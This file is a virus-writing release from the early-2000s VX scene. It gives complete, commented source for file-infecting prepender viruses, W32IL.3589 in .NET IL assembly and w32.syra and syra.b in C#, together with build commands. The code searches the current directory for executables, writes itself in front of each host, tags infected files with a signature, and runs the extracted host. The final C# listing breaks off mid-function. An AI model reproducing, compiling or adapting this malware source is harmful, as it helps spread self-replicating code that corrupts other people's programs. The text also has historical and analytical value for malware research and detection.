
////////////////////////////////////////////////////////////////////////////////////////////////////[3589.TXT]////////////////
//  //////W32IL.3589//////
//  //////////////////////
//
//  After writing my first d flat virus w32.syra (AKA w32.flatei by Mcafee/AVP, w32.flat by CA), i thought
//  of optimizing it a little bit. i dragged w32.syra at my ildasm, did some necessary mods and w32.3589
//  is born...
//  
//  w32.3589 is a variant of w32.syra which infects exe files in current directory.. infection : 1 file
//  at a time... it prepends itself to the victim file and when the victim is executed, the virus in it
//  infects another exe file in current directory, extracts the host bytes, writes this to "alcopaul.exe"
//  and executes "alcopaul.exe"..
//
//  the actual virus size is 3584 + 4 byte signature + 1 byte (?)...
//
//  system requirements : .net framework/sdk/w32
//
//  to produce the virus, go to msdos console, go to the directory where ilasm.exe resides, then type
//
//  ilasm 3589.txt /exe
//
//
//  with comments from me...
//
//  why w32il? w32 = windows platform, il = intermediate language.. :P
//
//
//  illawesome
//  [brigadaocho]
//  [rrlf]
//
//  greetz
//  
//  .syra ("my little sis.. study hard..")
//  .alcopaul ("LAME VB CODER! (this time, LAME C# coder) eherm.. heheheheh...")
//  .jackie ("expecting new stuffs from you man... the INTERVIEW.. hehehheh")
//  .slagehammer ("thanks for being there...")
//  .philie ("amsterdam!")
//  .ergrone ("cpl rulz.. anotha great delphi coder...")
//  .powerdryv ("my long lost sally oners..")
//  .quote from 29a6 article ".NET/dotNET virus" by benny/29a ("....Everything began when I started to explore 
//                             the .NET Common Language Runtime
//                             platform, designed by Microsoft. I wrote an article about it and started to
//                             work on one very trivial virus that could show how to use class librariez.
//                             Everything in C#.
//                             The idea was very simple - create sample of prepender written in C#. How easy
//                             it sounded, so hard to code it was. C#, such like Java have VERY STRICT type
//                             checking. And I figured out that there's NO easy way how to work with
//                             stringz - once a string is defined, you CAN'T change it - and I needed to
//                             do that, becoz it was very important for viral functionality.
//                             That sucked....")
//  .benny ("heh!. i did w32.syra in one day. anyways, thankie for the inspiration.. heheehh")
//  .brigadaocho ("b8 ezine #1!")
//  .rrlf ("rrlf #3!")
//  .diskordia/[rrlf] ("hottie!")
//  .johnlw ("read the gnu/gpl!")
//  .kahuna ("let's be friends.. hehheeheh")
//  .LJ ("thanks for producing vxtasy.. the definitive guide man..")  
//  .Energy ("kewl vb codes, and delphi codes too.. suggestion : p2p worms suck.. :)")
//  .Arkhangel ("heya, boss")
//  .
//  .most of all, my vx soulmate PetiK ("hey man. cum back to the scene and let's rock the casbah.. :)")
//
//  e-mail me at alcopaulvx@yahoo.com
//  see my codes at http://alcopaul.cjb.net
//  http://brigadaocho.host.sk  
//
//  september 12, 2002 : edited the disasm comments and added some greets
//
//  
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

.module extern shell32.dll
.assembly extern mscorlib{}
.assembly v3589{}
.subsystem 0x00000002
.class private auto ansi beforefieldinit v3589_
       extends [mscorlib]System.Object
{
  .class auto ansi nested public beforefieldinit Win32
         extends [mscorlib]System.Object
  {
    .method public hidebysig static pinvokeimpl("shell32.dll" autochar winapi) 
            int32  ShellExecute(int32 hWnd,
                                string oper,
                                string file,
                                string param,
                                string dir,
                                int32 type) cil managed preservesig
    {
    } // essential win32api coz .net framework is not installed fully in my windows me... system.diagnostics.process can't be found..
    .method public hidebysig specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // in every class, .ctor should be present..

  }

  .method public hidebysig static void  Main(string[] args) cil managed
  {
    .entrypoint
    // Code size       431 (0x1af)
    .maxstack  6
    .locals (class [mscorlib]System.Reflection.Module V_0,
             string[] V_1,
             string V_2,
             class [mscorlib]System.IO.FileStream V_3,
             class [mscorlib]System.IO.StreamReader V_4,
             int32 V_5,
             int32 V_6,
             string V_7,
             string V_8,
             class [mscorlib]System.IO.FileStream V_9,
             class [mscorlib]System.IO.BinaryReader V_10,
             int32 V_11,
             int32 V_12,
             unsigned int8[] V_13,
             int32 V_14,
             int32 V_15,
             int32 V_16,
             class [mscorlib]System.IO.FileStream V_17,
             class [mscorlib]System.IO.BinaryWriter V_18,
             string V_19,
             string[] V_20,
             int32 V_21)
    IL_0000:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetExecutingAssembly()
    IL_0005:  callvirt   instance class [mscorlib]System.Reflection.Module[] [mscorlib]System.Reflection.Assembly::GetModules()
    IL_000a:  ldc.i4.0
    IL_000b:  ldelem.ref // reflection
    IL_000c:  stloc.0
    IL_000d:  call       string [mscorlib]System.IO.Directory::GetCurrentDirectory()
    IL_0012:  ldstr      "*.exe"
    IL_0017:  call       string[] [mscorlib]System.IO.Directory::GetFiles(string,
                                                                          string)
    IL_001c:  stloc.1
    IL_001d:  ldloc.1
    IL_001e:  stloc.s    V_20 // list all exe files of current directory to array
    IL_0020:  ldc.i4.0
    IL_0021:  stloc.s    V_21
    IL_0023:  br.s       IL_00a3 // if no files available, extract host

    IL_0025:  ldloc.s    V_20
    IL_0027:  ldloc.s    V_21
    IL_0029:  ldelem.ref      // examine victim for sig
    IL_002a:  stloc.2
    IL_002b:  ldloc.2
    IL_002c:  ldc.i4.4
    IL_002d:  ldc.i4.1
    IL_002e:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                             valuetype [mscorlib]System.IO.FileMode,
                                                                             valuetype [mscorlib]System.IO.FileAccess) // open
    IL_0033:  stloc.3
    IL_0034:  ldloc.3
    IL_0035:  newobj     instance void [mscorlib]System.IO.StreamReader::.ctor(class [mscorlib]System.IO.Stream) // read
    IL_003a:  stloc.s    V_4
    IL_003c:  ldloc.3
    IL_003d:  callvirt   instance int64 [mscorlib]System.IO.Stream::get_Length() // get full length of victim
    IL_0042:  conv.i4
    IL_0043:  stloc.s    V_5 // V_5 contains its length
    IL_0045:  ldloc.s    V_5
    IL_0047:  ldc.i4.4
    IL_0048:  sub            // V_5 - 4
    IL_0049:  stloc.s    V_6  // store result to V_6
    IL_004b:  ldloc.s    V_4 // init variable for the signature...
    IL_004d:  callvirt   instance class [mscorlib]System.IO.Stream [mscorlib]System.IO.StreamReader::get_BaseStream()
    IL_0052:  ldloc.s    V_6 // offset
    IL_0054:  conv.i8    // convert V_6 to int64
    IL_0055:  ldc.i4.0   // origin
    IL_0056:  callvirt   instance int64 [mscorlib]System.IO.Stream::Seek(int64,
                                                                         valuetype [mscorlib]System.IO.SeekOrigin)
    IL_005b:  pop
    IL_005c:  ldloc.s    V_4 // load object
    IL_005e:  callvirt   instance string [mscorlib]System.IO.TextReader::ReadLine()
    IL_0063:  stloc.s    V_7 // V_7 = read 4 bytes at the end
    IL_0065:  ldloc.s    V_4
    IL_0067:  callvirt   instance void [mscorlib]System.IO.TextReader::Close()
    IL_006c:  ldstr      "paul"
    IL_0071:  stloc.s    V_8
    IL_0073:  ldloc.s    V_7 // 4 bytes
    IL_0075:  ldloc.s    V_8 // "paul"
    IL_0077:  call       bool [mscorlib]System.String::op_Equality(string,
                                                                   string) // check for virus signature , 4 bytes = "paul"?
    IL_007c:  brfalse.s  IL_0080 // false goto 0080

    IL_007e:  br.s       IL_009d // true, next victim in array

    IL_0080:  ldloc.2 // check if the file is infecting itself
    IL_0081:  ldloc.0 // victim name
    IL_0082:  callvirt   instance string [mscorlib]System.Reflection.Module::get_FullyQualifiedName() // virus name
    IL_0087:  call       bool [mscorlib]System.String::op_Equality(string,
                                                                   string)
    IL_008c:  brfalse.s  IL_0090 // false goto infest (0090)

    IL_008e:  br.s       IL_009d // true, next victim in array

    .try // use Exception handling
    {
      IL_0090:  ldloc.2
      IL_0091:  call       void v3589_::infest(string) // infect file
      IL_0096:  leave.s    IL_009b // finished then extract and execute the victim..

    }
    catch [mscorlib]System.Object 
    {
      IL_0098:  pop
      IL_0099:  leave.s    IL_009d // if error, next victim

    }
    IL_009b:  br.s       IL_00ae

    IL_009d:  ldloc.s    V_21 // next victim in array
    IL_009f:  ldc.i4.1
    IL_00a0:  add
    IL_00a1:  stloc.s    V_21
    IL_00a3:  ldloc.s    V_21
    IL_00a5:  ldloc.s    V_20
    IL_00a7:  ldlen
    IL_00a8:  conv.i4
    IL_00a9:  blt        IL_0025 // repeat itself

    IL_00ae:  ldloc.0
    IL_00af:  callvirt   instance string [mscorlib]System.Reflection.Module::get_FullyQualifiedName() // ilasm version of app.path & "\" & app.exename & ".exe"
    IL_00b4:  ldc.i4.4   //  open or create
    IL_00b5:  ldc.i4.1   //  read itself
    IL_00b6:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                             valuetype [mscorlib]System.IO.FileMode,
                                                                             valuetype [mscorlib]System.IO.FileAccess)
    IL_00bb:  stloc.s    V_9
    IL_00bd:  ldloc.s    V_9 // pass variable to Binary Reader
    IL_00bf:  newobj     instance void [mscorlib]System.IO.BinaryReader::.ctor(class [mscorlib]System.IO.Stream) // new object
    IL_00c4:  stloc.s    V_10 // store the result in V_10
    IL_00c6:  ldloc.s    V_9 // FileStream object
    IL_00c8:  callvirt   instance int64 [mscorlib]System.IO.Stream::get_Length() // c# version : int V_11 = (int) V_9.Length
    IL_00cd:  conv.i4    // force conversion
    IL_00ce:  stloc.s    V_11 // store the result to V_11
    IL_00d0:  ldloc.s    V_11 // load V_11
    IL_00d2:  ldc.i4     0xE00 // 3584
    IL_00d7:  sub
    IL_00d8:  stloc.s    V_12
    IL_00da:  ldloc.s    V_10
    IL_00dc:  callvirt   instance class [mscorlib]System.IO.Stream [mscorlib]System.IO.BinaryReader::get_BaseStream()
    IL_00e1:  ldc.i4     0xE00 // 3584 offset (skip virus bytes.. read host bytes)
    IL_00e6:  conv.i8        // convert 3586 to int 64 and it'll be the first parameter of Seek
    IL_00e7:  ldc.i4.0       // origin, 0
    IL_00e8:  callvirt   instance int64 [mscorlib]System.IO.Stream::Seek(int64,
                                                                         valuetype [mscorlib]System.IO.SeekOrigin)
    IL_00ed:  pop
    IL_00ee:  ldloc.s    V_12
    IL_00f0:  conv.ovf.u4
    IL_00f1:  newarr     [mscorlib]System.Byte // initialize byte array
    IL_00f6:  stloc.s    V_13
    IL_00f8:  ldloc.s    V_12
    IL_00fa:  stloc.s    V_14
    IL_00fc:  ldc.i4.0
    IL_00fd:  stloc.s    V_15
    IL_00ff:  br.s       IL_0124

    IL_0101:  ldloc.s    V_10 // initialize binaryreader
    IL_0103:  ldloc.s    V_13 // bytes
    IL_0105:  ldloc.s    V_15 // number of bytes read
    IL_0107:  ldloc.s    V_14 // number of bytes to read
    IL_0109:  callvirt   instance int32 [mscorlib]System.IO.BinaryReader::Read(unsigned int8[],
                                                                               int32,
                                                                               int32)
    // read all bytes
    IL_010e:  stloc.s    V_16 
    IL_0110:  ldloc.s    V_16
    IL_0112:  brtrue.s   IL_0116

    IL_0114:  br.s       IL_0129

    IL_0116:  ldloc.s    V_15
    IL_0118:  ldloc.s    V_16
    IL_011a:  add
    IL_011b:  stloc.s    V_15
    IL_011d:  ldloc.s    V_14
    IL_011f:  ldloc.s    V_16
    IL_0121:  sub
    IL_0122:  stloc.s    V_14
    IL_0124:  ldloc.s    V_14
    IL_0126:  ldc.i4.0
    IL_0127:  bgt.s      IL_0101
    // end read loop
    IL_0129:  ldloc.s    V_10
    IL_012b:  callvirt   instance void [mscorlib]System.IO.BinaryReader::Close() // close file
    IL_0130:  ldstr      "alcopaul.exe" // host file name
    IL_0135:  ldc.i4.4   // open or create
    IL_0136:  ldc.i4.2  // write
    IL_0137:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                             valuetype [mscorlib]System.IO.FileMode,
                                                                             valuetype [mscorlib]System.IO.FileAccess)
    IL_013c:  stloc.s    V_17
    IL_013e:  ldloc.s    V_17
    IL_0140:  newobj     instance void [mscorlib]System.IO.BinaryWriter::.ctor(class [mscorlib]System.IO.Stream)
    IL_0145:  stloc.s    V_18
    IL_0147:  ldloc.s    V_18
    IL_0149:  callvirt   instance class [mscorlib]System.IO.Stream [mscorlib]System.IO.BinaryWriter::get_BaseStream()
    IL_014e:  ldc.i4.0  // beginning
    IL_014f:  conv.i8   // convert to int64
    IL_0150:  ldc.i4.0  // beginning
    IL_0151:  callvirt   instance int64 [mscorlib]System.IO.Stream::Seek(int64,
                                                                         valuetype [mscorlib]System.IO.SeekOrigin)
    IL_0156:  pop
    IL_0157:  ldloc.s    V_18
    IL_0159:  ldloc.s    V_13  // host bytes
    IL_015b:  callvirt   instance void [mscorlib]System.IO.BinaryWriter::Write(unsigned int8[])
    IL_0160:  ldloc.s    V_18
    IL_0162:  callvirt   instance void [mscorlib]System.IO.BinaryWriter::Close() // close alcopaul.exe
    IL_0167:  call       string [mscorlib]System.IO.Directory::GetCurrentDirectory() // get current directory
    IL_016c:  stloc.s    V_19 // store path to V_19
    // shellexecute api
    IL_016e:  ldc.i4.0   // 0  
    IL_016f:  ldnull     // null
    IL_0170:  ldstr      "alcopaul.exe" // filename
    IL_0175:  ldnull     // null
    IL_0176:  ldloc.s    V_19 // current directory 
    IL_0178:  ldc.i4.1   // show normal
    IL_0179:  call       int32 v3589_/Win32::ShellExecute(int32,
                                                                         string,
                                                                         string,
                                                                         string,
                                                                         string,
                                                                         int32) // shell execute host
    IL_017e:  pop
    //use seh to delete alcopaul.exe
    .try
    {
      IL_017f:  ldstr      "alcopaul.exe"
      IL_0184:  call       void [mscorlib]System.IO.File::Delete(string) 
      IL_0189:  leave.s    IL_018e // check if alcopaul.exe exists

    }  // end .try
    catch [mscorlib]System.Object 
    {
      IL_018b:  pop
      IL_018c:  leave.s    IL_017f

    }  // end handler
    IL_018e:  ldstr      "alcopaul.exe"
    IL_0193:  call       bool [mscorlib]System.IO.File::Exists(string)
    IL_0198:  brfalse.s  IL_019c // false then end virus

    IL_019a:  br.s       IL_017f // host temp file still exists, goto del alcopaul.exe
    IL_019c:  ret // end virus
  }

  .method public hidebysig static void  infest(string host) cil managed
  {
    // Code size       300 (0x12c)
    .maxstack  4
    .locals (class [mscorlib]System.Reflection.Module V_0,
             class [mscorlib]System.IO.FileStream V_1,
             class [mscorlib]System.IO.BinaryReader V_2,
             unsigned int8[] V_3,
             int32 V_4,
             int32 V_5,
             int32 V_6,
             class [mscorlib]System.IO.FileStream V_7,
             class [mscorlib]System.IO.BinaryReader V_8,
             unsigned int8[] V_9,
             int32 V_10,
             int32 V_11,
             int32 V_12,
             class [mscorlib]System.IO.FileStream V_13,
             class [mscorlib]System.IO.BinaryWriter V_14)
    IL_0000:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetExecutingAssembly()
    IL_0005:  callvirt   instance class [mscorlib]System.Reflection.Module[] [mscorlib]System.Reflection.Assembly::GetModules()
    IL_000a:  ldc.i4.0
    IL_000b:  ldelem.ref // reflection
    IL_000c:  stloc.0
    IL_000d:  ldloc.0
    IL_000e:  callvirt   instance string [mscorlib]System.Reflection.Module::get_FullyQualifiedName() // app.path & "\" & app.exename & ".exe"
    IL_0013:  ldc.i4.4   // open or create
    IL_0014:  ldc.i4.1   // read
    IL_0015:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                             valuetype [mscorlib]System.IO.FileMode,
                                                                             valuetype [mscorlib]System.IO.FileAccess) // new object
    IL_001a:  stloc.1
    IL_001b:  ldloc.1
    IL_001c:  newobj     instance void [mscorlib]System.IO.BinaryReader::.ctor(class [mscorlib]System.IO.Stream) // new object
    IL_0021:  stloc.2
    IL_0022:  ldloc.2
    IL_0023:  callvirt   instance class [mscorlib]System.IO.Stream [mscorlib]System.IO.BinaryReader::get_BaseStream()
    IL_0028:  ldc.i4.0 // origin
    IL_0029:  conv.i8  // convert to int64
    IL_002a:  ldc.i4.0 // origin
    IL_002b:  callvirt   instance int64 [mscorlib]System.IO.Stream::Seek(int64,
                                                                         valuetype [mscorlib]System.IO.SeekOrigin)
    IL_0030:  pop
    IL_0031:  ldc.i4     0xE00 // virus
    IL_0036:  newarr     [mscorlib]System.Byte
    IL_003b:  stloc.3
    IL_003c:  ldc.i4     0xE00
    IL_0041:  stloc.s    V_4
    IL_0043:  ldc.i4.0
    IL_0044:  stloc.s    V_5
    IL_0046:  br.s       IL_0069

    IL_0048:  ldloc.2
    IL_0049:  ldloc.3
    IL_004a:  ldloc.s    V_5
    IL_004c:  ldloc.s    V_4
    IL_004e:  callvirt   instance int32 [mscorlib]System.IO.BinaryReader::Read(unsigned int8[],
                                                                               int32,
                                                                               int32) // read itself
    IL_0053:  stloc.s    V_6
    IL_0055:  ldloc.s    V_6
    IL_0057:  brtrue.s   IL_005b

    IL_0059:  br.s       IL_006e

    IL_005b:  ldloc.s    V_5
    IL_005d:  ldloc.s    V_6
    IL_005f:  add
    IL_0060:  stloc.s    V_5
    IL_0062:  ldloc.s    V_4
    IL_0064:  ldloc.s    V_6
    IL_0066:  sub
    IL_0067:  stloc.s    V_4
    IL_0069:  ldloc.s    V_4
    IL_006b:  ldc.i4.0
    IL_006c:  bgt.s      IL_0048

    IL_006e:  ldloc.2
    IL_006f:  callvirt   instance void [mscorlib]System.IO.BinaryReader::Close() // close itself
    IL_0074:  ldarg.0 // victim
    IL_0075:  ldc.i4.4    // open or create
    IL_0076:  ldc.i4.1  // read
    IL_0077:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                             valuetype [mscorlib]System.IO.FileMode,
                                                                             valuetype [mscorlib]System.IO.FileAccess)
    IL_007c:  stloc.s    V_7
    IL_007e:  ldloc.s    V_7 // object FileStream
    IL_0080:  newobj     instance void [mscorlib]System.IO.BinaryReader::.ctor(class [mscorlib]System.IO.Stream)
    IL_0085:  stloc.s    V_8
    IL_0087:  ldloc.s    V_8  // object BinaryReader 
    IL_0089:  callvirt   instance class [mscorlib]System.IO.Stream [mscorlib]System.IO.BinaryReader::get_BaseStream()
    IL_008e:  ldc.i4.0   // beginning
    IL_008f:  conv.i8    // convert to int 64
    IL_0090:  ldc.i4.0   // beginning 0
    IL_0091:  callvirt   instance int64 [mscorlib]System.IO.Stream::Seek(int64,
                                                                         valuetype [mscorlib]System.IO.SeekOrigin)
    IL_0096:  pop
    IL_0097:  ldloc.s    V_7 // FileStream
    IL_0099:  callvirt   instance int64 [mscorlib]System.IO.Stream::get_Length() // FileStream.Length of victim
    IL_009e:  conv.ovf.u4
    IL_009f:  newarr     [mscorlib]System.Byte
    IL_00a4:  stloc.s    V_9
    IL_00a6:  ldloc.s    V_7
    IL_00a8:  callvirt   instance int64 [mscorlib]System.IO.Stream::get_Length()
    IL_00ad:  conv.i4
    IL_00ae:  stloc.s    V_10
    IL_00b0:  ldc.i4.0
    IL_00b1:  stloc.s    V_11
    IL_00b3:  br.s       IL_00d8

    IL_00b5:  ldloc.s    V_8
    IL_00b7:  ldloc.s    V_9
    IL_00b9:  ldloc.s    V_11
    IL_00bb:  ldloc.s    V_10
    IL_00bd:  callvirt   instance int32 [mscorlib]System.IO.BinaryReader::Read(unsigned int8[],
                                                                               int32,
                                                                               int32) // read victim bytes
    IL_00c2:  stloc.s    V_12
    IL_00c4:  ldloc.s    V_12
    IL_00c6:  brtrue.s   IL_00ca

    IL_00c8:  br.s       IL_00dd

    IL_00ca:  ldloc.s    V_11
    IL_00cc:  ldloc.s    V_12
    IL_00ce:  add
    IL_00cf:  stloc.s    V_11
    IL_00d1:  ldloc.s    V_10
    IL_00d3:  ldloc.s    V_12
    IL_00d5:  sub
    IL_00d6:  stloc.s    V_10
    IL_00d8:  ldloc.s    V_10
    IL_00da:  ldc.i4.0
    IL_00db:  bgt.s      IL_00b5

    IL_00dd:  ldloc.s    V_8
    IL_00df:  callvirt   instance void [mscorlib]System.IO.BinaryReader::Close() // close
    IL_00e4:  ldarg.0    // victim
    IL_00e5:  ldc.i4.4   // open or create
    IL_00e6:  ldc.i4.2   // write
    IL_00e7:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                             valuetype [mscorlib]System.IO.FileMode,
                                                                             valuetype [mscorlib]System.IO.FileAccess)
    IL_00ec:  stloc.s    V_13
    IL_00ee:  ldloc.s    V_13 // load filestream object
    IL_00f0:  newobj     instance void [mscorlib]System.IO.BinaryWriter::.ctor(class [mscorlib]System.IO.Stream)
    IL_00f5:  stloc.s    V_14
    IL_00f7:  ldloc.s    V_14  // load binarywriter object
    IL_00f9:  callvirt   instance class [mscorlib]System.IO.Stream [mscorlib]System.IO.BinaryWriter::get_BaseStream()
    IL_00fe:  ldc.i4.0   // beginning
    IL_00ff:  conv.i8    // convert to int64
    IL_0100:  ldc.i4.0   // 0, beginning
    IL_0101:  callvirt   instance int64 [mscorlib]System.IO.Stream::Seek(int64,
                                                                         valuetype [mscorlib]System.IO.SeekOrigin)
    IL_0106:  pop
    IL_0107:  ldloc.s    V_14  // object binarywriter
    IL_0109:  ldloc.3    // virusbytes
    IL_010a:  callvirt   instance void [mscorlib]System.IO.BinaryWriter::Write(unsigned int8[]) // write
    IL_010f:  ldloc.s    V_14  // object binarywriter
    IL_0111:  ldloc.s    V_9  // hostbytes
    IL_0113:  callvirt   instance void [mscorlib]System.IO.BinaryWriter::Write(unsigned int8[]) // write
    IL_0118:  ldloc.s    V_14  // object binarywriter
    IL_011a:  ldstr      "paul" // signature
    IL_011f:  callvirt   instance void [mscorlib]System.IO.BinaryWriter::Write(string) // write
    IL_0124:  ldloc.s    V_14 // object binarywriter
    IL_0126:  callvirt   instance void [mscorlib]System.IO.BinaryWriter::Close() // close
    IL_012b:  ret // end infest
  }

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  }

}
//////////////////////////////////////////////////////////////////////////////////////////////////[3589.TXT]//////////////////
////////////////////////////////////// illawesome experiments : branch of the booze zen productions //////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////// philippines 3300 //////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////////////////[syra.cs]///////////////////////
// w32.syra (aka w32.hllp.flatei)											//////
//															//////
// i did it after reading benny's frustration in 29a6 of writing a c# virus...  - alcopaul                              //////
//															//////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// csc /target:winexe syra.cs           ////
// copy con alco.sig                    ////
// alco^Z                               ////
// copy /b syra.exe+alco.sig vir.exe    ////
// copy vir.exe syra.exe                ////
// y				        ////
////////////////////////////////////////////
// "flatei, not sharpei..."      ///////////
////////////////////////////////////////////

using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

class msil_syra_by_alcopaul
{
   public class Win32 {
   [DllImport("shell32.dll", CharSet=CharSet.Auto)]
   public static extern int ShellExecute(int hWnd, String oper, String file, String param, 
                     String dir, int type);
   [DllImport("user32.dll", CharSet=CharSet.Auto)]
   public static extern int MessageBox(int hWnd, String text, 
                     String caption, uint type);
   }
  public static void Main(String[] args)
   {
   Module exename = Assembly.GetExecutingAssembly().GetModules()[0];
   string[] files = Directory.GetFiles(Directory.GetCurrentDirectory(), "*.exe");
   foreach (string file in files){
   FileStream fs = new FileStream(file, FileMode.OpenOrCreate, FileAccess.Read);
   StreamReader r = new StreamReader(fs);
   int fff = (int) fs.Length;
   int rrr = fff - 4;
   r.BaseStream.Seek(rrr, SeekOrigin.Begin);
   string g = r.ReadLine();
   r.Close();
   string hhh = "alco";
   if (g==hhh)
   continue;
   else
   if (file==exename.FullyQualifiedName)
   continue;
   else
   try
      {  
      Infect(file);
      }
   catch
      {
      continue;
      }
   break;
   }
   FileStream fs1 = new FileStream(exename.FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read);
   BinaryReader r1 = new BinaryReader(fs1);
   int host = (int) fs1.Length;
   int vir = host - 5124;
   r1.BaseStream.Seek(5124, SeekOrigin.Begin);
   byte[] bytes = new byte[vir];
   int numBytesToRead = vir;
   int numBytesRead = 0;
   while (numBytesToRead > 0)
   {
   int n = r1.Read(bytes, numBytesRead, numBytesToRead);
   if (n==0)
   break;
   numBytesRead += n;
   numBytesToRead -= n;
   }
   r1.Close();
   FileStream fs11 = new FileStream("hostbyte.exe", FileMode.OpenOrCreate, FileAccess.Write);
   BinaryWriter w1 = new BinaryWriter(fs11);         
   w1.BaseStream.Seek(0, SeekOrigin.Begin);
   w1.Write(bytes);
   w1.Close();
   string rect = Directory.GetCurrentDirectory();
   Win32.ShellExecute(0, null, "hostbyte.exe", null, rect, 1);
   wet:
      try
      {
      File.Delete("hostbyte.exe");
      }
      catch
      {
      goto wet;
      }
      if (File.Exists("hostbyte.exe")==true)
      goto wet;
   Win32.MessageBox(0, "::: prepending virus purely written in d flat :::", "msil.syra by alcopaul",
                   0);
}
   public static void Infect(string host)
   { 
     Module mod = Assembly.GetExecutingAssembly().GetModules()[0];
     FileStream fs = new FileStream(mod.FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read);
     BinaryReader r = new BinaryReader(fs);        
     r.BaseStream.Seek(0, SeekOrigin.Begin);
     byte[] bytes = new byte[5124];
     int numBytesToRead = (int) 5124;
     int numBytesRead = 0;
     while (numBytesToRead > 0)
     {
     int n = r.Read(bytes, numBytesRead, numBytesToRead);
     if (n==0)
     break;
     numBytesRead += n;
     numBytesToRead -= n;
    }
     r.Close();
     FileStream fs133 = new FileStream(host, FileMode.OpenOrCreate, FileAccess.Read);
     BinaryReader w33 = new BinaryReader(fs133);
     w33.BaseStream.Seek(0, SeekOrigin.Begin);
     byte[] bytes2 = new byte[fs133.Length];
     int numBytesToRead2 = (int) fs133.Length;
     int numBytesRead2 = 0;
     while (numBytesToRead2 > 0)
     {
     int n = w33.Read(bytes2, numBytesRead2, numBytesToRead2);
     if (n==0)
     break;
     numBytesRead2 += n;
     numBytesToRead2 -= n;
     }
     w33.Close();
     FileStream fs1 = new FileStream(host, FileMode.OpenOrCreate, FileAccess.Write);
     BinaryWriter w = new BinaryWriter(fs1);         
     w.BaseStream.Seek(0, SeekOrigin.Begin);
     w.Write(bytes);
     w.Write(bytes2);
     w.Write("alco");
     w.Close();
  }
}

//////////////////////////////////////////////////////////////////////////////////////////////[syra.b.cs]///////////////////
//////////////////////
// w32.syra.b ///////
////////////////////

// sept. 22, 2002 - now syra only infects dotnet exe files, in current directory and in (1 second / 1 Hertz) fashion...
//
// csc /target:winexe syra.b.cs (no more copy con shitz unlike in the first version..)
//
// alcopaul
// brigada ocho & rrlf
//
//

using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

class msil_syra_by_alcopaul
{
   public class Win32 {
   [DllImport("shell32.dll", CharSet=CharSet.Auto)]
   public static extern int ShellExecute(int hWnd, String oper, String file, String param, 
                     String dir, int type);
   [DllImport("user32.dll", CharSet=CharSet.Auto)]
   public static extern int MessageBox(int hWnd, String text, 
                     String caption, uint type);
   }
  public static void Main(String[] args)
   {
   Module exename = Assembly.GetExecutingAssembly().GetModules()[0];
   string[] files = Directory.GetFiles(Directory.GetCurrentDirectory(), "*.exe");
   foreach (string file in files){
   try
   {
   AssemblyName.GetAssemblyName(file); // !!!! check if msil :: on error goto next file
   FileStream fs = new FileStream(file, FileMode.OpenOrCreate, FileAccess.Read);
   StreamReader r = new StreamReader(fs);
   int fff = (int) fs.Length;
   int rrr = fff - 4;
   r.BaseStream.Seek(rrr, SeekOrigin.Begin);
   string g = r.ReadLine();
   r.Close();
   string hhh = "alco";
   if (g==hhh)
   continue;
   else
   if (file==exename.FullyQualifiedName)
   continue;
   else
   try
      {  
      Infect(file);
      }
   catch
      {
      continue;
      }
   break;
   }
   catch
   {
   continue;
   }
   }
   FileStream fs1 = new FileStream(exename.FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read);
   BinaryReader r1 = new BinaryReader(fs1);
   int host = (int) fs1.Length;
   int vir = host - 5120;
   r1.BaseStream.Seek(5120, SeekOrigin.Begin);
   byte[] bytes = new byte[vir];
   int numBytesToRead = vir;
   int numBytesRead = 0;
   while (numBytesToRead > 0)
   {
   int n = r1.Read(bytes, numBytesRead, numBytesToRead);
   if (n==0)
   break;
   numBytesRead += n;
   numBytesToRead -= n;
   }
   r1.Close();
   FileStream fs11 = new FileStream("_U-.exe", FileMode.OpenOrCreate, FileAccess.Write);
   BinaryWriter w1 = new BinaryWriter(fs11);         
   w1.BaseStream.Seek(0, SeekOrigin.Begin);
   w1.Write(bytes);
   w1.Close();
   string rect = Directory.GetCurrentDirectory();
   Win32.ShellExecute(0, null, "_U-.exe", null, rect, 1);
   wet:
      try
      {
      File.Delete("_U-.exe");
      }
      catch
      {
      goto wet;
      }
      if (File.Exists("_U-.exe")==true)
      goto wet;
   Win32.MessageBox(0, "::: now infecting dotnet files only :P :::", "msil.syra.b by alcopaul",
                   0);
}
   public static void Infect(string host)
   { 
     Module mod = Assembly.GetExecutingAssembly().GetModules()[0];
     FileStream fs = new FileStream(mod.FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read);
     BinaryReader r = new BinaryReader(fs);        
     r.BaseStream.Seek(0, SeekOrigin.Begin);
     byte[] bytes = new byte[5120];
     int numBytesToRead = (int) 5120;
     int numBytesRead = 0;
     while (numBytesToRead > 0)
     {
     int n = r.Read(bytes, numBytesRead, numBytesToRead);
     if (n==0)
     break;
     numBytesRead += n;
     numBytesToRead -= n;
    }
     r.Close();
     FileStream fs133 = new FileStream(host, FileMode.OpenOrCreate, FileAccess.Read);
     BinaryReader w33 = new BinaryReader(fs133);
     w33.BaseStream.Seek(0, SeekOrigin.Begin);
     byte[] bytes2 = new byte[fs133.Length];
     int numBytesToRead2 = (int) fs133.Length;
